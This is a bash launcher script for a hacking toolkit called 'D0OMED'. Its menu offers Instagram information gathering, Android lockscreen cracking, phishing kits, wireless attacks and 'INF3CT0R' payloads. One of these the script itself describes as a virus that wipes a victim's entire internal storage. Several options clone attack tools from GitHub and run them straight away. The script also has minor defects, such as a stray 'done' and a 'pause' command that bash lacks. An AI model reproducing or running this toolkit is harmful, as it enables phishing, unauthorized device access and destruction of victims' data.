  #!/bin/bash

# colour 
Black="\033[1;30m"       # Black
Red="\033[1;31m"         # Red
Green="\033[1;32m"       # Green
Yellow="\033[1;33m"      # Yellow
Blue="\033[1;34m"        # Blue
Purple="\033[1;35m"      # Purple
Cyan="\033[1;36m"        # Cyan
White="\033[1;37m"       # White

clear
apt-get update
apt-get upgrade
apt-get install python
apt-get install python2
clear
echo -e "$Green Created By \e[1;34m"
figlet C0DE BREAK3RS | lolcat
sleep 2.0

    echo " "
    echo -e "$Red⫸ Coded by$Yellow C0DE BREAK3RZ$Red ⫷\033[0m"
    echo -e "$Red⫸$Red D0OMED$Red ⫷\033[0m"
echo " "
echo -e " $Red ⫸ $Cyan [SELECT OPTION] $Blue ⫷ "
echo -e " $Red "
echo -e " $Red $Purple»$Yellow[1] Insta information gathering$Blue"
echo -e " $Red $Purple»$Yellow[2] Crack Android Lockscreen [ROOT]$Blue"
echo -e " $Red $Purple»$Yellow[3] Phishing hacks$Blue"
echo -e " $Red $Purple»$Yellow[4] Wireless Attacks$Blue"
echo -e " $Red $Purple»$Yellow[5] INF3CT0R V1 [LINKS]$Blue"
echo -e " $Red $Purple»$Yellow[6] Update D0OMED$Blue"
echo -e " $Red $Purple»$Yellow[7] About D0OM3D$Blue"
echo -e " $Red $Purple»$Yellow[8] INF3CT0R V2 [APPS, TEXTS]$Blue"
echo -e " $Red $Purple»$Yellow[9] exit$Blue"
echo -e " $Red "
echo -e " $Red ⫸ $Cyan [SELECT OPTION] $Blue⫷"
echo -e " "
echo " "
echo " "

    read ch
   if [ $ch -eq 1 ];then
        #cd $HOME
        #cd Xteam
        cd Ig_information_gathering
        bash start.sh

        exit
    elif [ $ch -eq 2 ];then 
         #cd $HOME
         git clone https://github.com/tegal1337/CiLocks
         cd CiLocks
         chmod +x cilocks
         bash cilocks
        
        exit
    elif [ $ch -eq 3 ];then
        #git clone git://github.com/xAstroDev/AstroPhisherTool
        cd AstroPhisherTool
        bash setup
        bash astrophisher

        exit
    elif [ $ch -eq 4 ];then
        #git clone --depth 1 https://github.com/v1s1t0r1sh3r3/airgeddon.git
        cd airgeddon
        bash airgeddon.sh


        exit
    elif [ $ch -eq 5 ];then
        #cd $HOME
        #cd Xteam
        cd INF3CT0Rv1
        echo -e "\e[1;34m  This Virus Formates (Deletes) the victims Full Internal Storage So think Before you Use It."
        bash infect.sh
        
     
        exit
   elif [ $ch -eq 6 ];then 
        echo -e "\e[1;34m Downloading Latest Files..."
        #cd $HOME
        rm -rf DOOM3D
        git clone https://github.com/xploitstech/Xteam
        cd D00M3D
        bash doomed.sh   
        
        exit
   elif [ $ch -eq 7 ];then
        echo -e  "\e[1;34m Downloading Latest Files..."
   elif [ $ch -eq 8 ];then 
        echo -e "\e[1;34m Loading..."
        cd INF3CT0Rv2
        bash infector.sh   
        
        exit
        

       
        
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
done
